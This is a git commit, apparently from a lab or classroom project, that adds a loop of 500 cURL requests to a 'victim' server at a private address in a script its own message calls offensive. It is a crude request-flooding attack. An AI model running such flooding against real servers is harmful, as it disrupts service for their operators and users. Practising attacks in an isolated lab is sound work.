636a0c58250a719c262dd856d56e5d39e74587d4
lemisora <lemisora@localhost.localdomain>
2026-07-03 12:57:52 -0600

    feat: se añade ataque básico con cURL al script ofensivo

--- of_script.sh
+++ of_script.sh
@@ -1,3 +1,7 @@
 #!/usr/bin/env bash
 
 echo "Este script sirve para realizar múltiples solicitudes a los puertos 80, 443 y 22 del servidor \"víctima\""
+
+for i in {1..500}; do
+    curl -s -o /dev/null http://192.168.122.29/
+done
